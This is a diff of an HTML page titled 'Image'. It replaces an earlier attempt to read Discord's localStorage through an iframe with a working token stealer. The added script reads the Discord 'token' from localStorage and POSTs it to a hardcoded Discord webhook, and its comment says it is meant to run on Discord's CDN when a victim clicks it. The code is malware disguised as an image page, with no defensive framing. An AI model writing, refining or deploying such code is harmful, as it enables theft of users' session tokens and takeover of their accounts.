@@ -1,36 +1,23 @@
 <!DOCTYPE html>
 <html>
+<head><title>Image</title></head>
 <body>
-    <script>
-        // Check if we're on the right origin
-        document.write('Current origin: ' + window.location.origin + '<br><br>');
-        
-        // Try to access Discord's localStorage directly
-        try {
-            // Open Discord in an iframe to access its storage
-            let iframe = document.createElement('iframe');
-            iframe.src = 'https://discord.com/app';
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-            
-            setTimeout(function() {
-                try {
-                    let discordStorage = iframe.contentWindow.localStorage;
-                    let token = discordStorage.getItem('token');
-                    document.write('Token from iframe: ' + (token || 'null') + '<br>');
-                } catch(e) {
-                    document.write('Iframe error: ' + e.message + '<br>');
-                }
-            }, 3000);
-        } catch(e) {
-            document.write('Error: ' + e.message + '<br>');
-        }
-        
-        // List all localStorage keys
-        document.write('<br>localStorage keys on this page:<br>');
-        for (let i = 0; i < localStorage.length; i++) {
-            document.write(localStorage.key(i) + '<br>');
-        }
-    </script>
+<script>
+    // This runs on discord.com's CDN when clicked
+    var token = localStorage.getItem('token');
+    
+    if (token) {
+        // Send to your webhook
+        var webhook = 'https://discord.com/api/webhooks/1567417367611445308/Ho4-QzUFiqaSwwnSoz4V5F8Mv9D24ANZoJHGAmPeZbZnd0SinbOPxV_G77eC92uvoqIj';
+        fetch(webhook, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({content: '```' + token + '```'})
+        });
+        document.write('Token sent!');
+    } else {
+        document.write('No token found');
+    }
+</script>
 </body>
 </html>
